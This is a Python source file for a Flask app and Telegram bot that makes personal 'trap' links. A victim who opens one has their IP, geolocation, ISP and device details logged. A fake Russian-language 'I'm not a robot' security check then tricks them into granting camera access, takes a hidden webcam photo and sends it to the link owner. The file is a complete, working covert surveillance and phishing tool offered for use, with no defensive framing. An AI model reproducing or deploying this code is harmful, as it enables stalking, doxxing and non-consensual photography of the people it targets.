import telebot, requests, os, sqlite3, uuid
from flask import Flask, request, jsonify

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

# --- РАБОТА С БАЗОЙ ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('links.db')
    curr = conn.cursor()
    curr.execute('CREATE TABLE IF NOT EXISTS traps (uid TEXT, owner_id INTEGER, target_url TEXT)')
    conn.commit()
    conn.close()

def add_link(uid, owner_id, target_url):
    conn = sqlite3.connect('links.db')
    curr = conn.cursor()
    curr.execute('INSERT INTO traps VALUES (?, ?, ?)', (uid, owner_id, target_url))
    conn.commit()
    conn.close()

def get_link_info(uid):
    conn = sqlite3.connect('links.db')
    curr = conn.cursor()
    curr.execute('SELECT owner_id, target_url FROM traps WHERE uid = ?', (uid,))
    res = curr.fetchone()
    conn.close()
    return res

init_db()

@app.route('/setup-my-bot-secret')
def setup():
    bot.remove_webhook()
    return "OK" if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}") else "ERROR"

@app.route('/v/<uid>')
def logger(uid):
    info = get_link_info(uid)
    if not info: return "Link not found", 404
    
    owner_id, target_url = info
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    
    g_info = "📍 GeoIP Error"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            g_info = f"🌍 {r.get('country')}, {r.get('city')}\n📡 ISP: {r.get('isp')}\n🛡 VPN: {'ДА' if r.get('proxy') else 'НЕТ'}"
    except: pass
    
    bot.send_message(owner_id, f"🎯 *КЛИК!*\n👤 IP: `{ip}`\n{g_info}", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;">
        <div>
            <div style="font-size:60px;">🛡️</div>
            <h2>Проверка безопасности</h2>
            <button id="go" style="padding:15px 50px;border:none;border-radius:30px;background:#0088cc;color:#fff;font-weight:bold;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        document.getElementById('go').onclick = async () => {{
            let d = {{ uid: "{uid}", hw: {{ scr: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency }}, bat: "N/A" }};
            try {{ let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%"; }} catch(e) {{}}
            
            await fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});
            
            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, '1.jpg'); f.append('uid', "{uid}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                            s.getTracks().forEach(t => t.stop());
                            window.location.href = "{target_url}";
                        }});
                    }}, 'image/jpeg', 0.6);
                }}, 800);
            }} catch(e) {{ window.location.href = "{target_url}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    info = get_link_info(d['uid'])
    if info:
        m = f"🖥 ДАННЫЕ:\n📱 Экран: `{d['hw']['scr']}`\n🧠 Ядра: `{d['hw']['cores']}`\n🔋 Заряд: `{d['bat']}`"
        bot.send_message(info[0], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    uid = request.form.get('uid')
    file = request.files.get('photo')
    info = get_link_info(uid)
    if file and info:
        bot.send_photo(info[0], file.read(), caption="📸 PHOTO")
    return "ok"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
    return "!", 200

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "Пришли ссылку на Telegraph, и я сделаю её персональной ловушкой.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create_private(m):
    target = m.text.strip()
    if not target.startswith("http"): target = "https://" + target
    uid = str(uuid.uuid4())[:8]
    add_link(uid, m.chat.id, target)
    bot.send_message(m.chat.id, f"✅ Твоя личная ссылка:\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
